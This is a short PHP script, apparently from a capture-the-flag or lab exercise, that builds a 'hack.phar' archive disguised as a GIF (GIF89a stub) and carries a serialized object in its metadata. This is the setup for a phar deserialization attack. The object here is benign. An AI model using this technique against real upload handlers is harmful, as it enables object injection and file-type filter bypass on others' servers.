<?php

class Boy
{
    var $name;
}

@unlink("hack.phar");
$phar = new Phar("hack.phar");
$phar->startBuffering();
$phar->setStub('GIF89a' . "<?php __HALT_COMPILER(); ?>"); // disguises as gif
$o = new Boy();
$o->name = "foo";
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();

//序列化不能有任何错误，否则序列化失败，返回空

?>
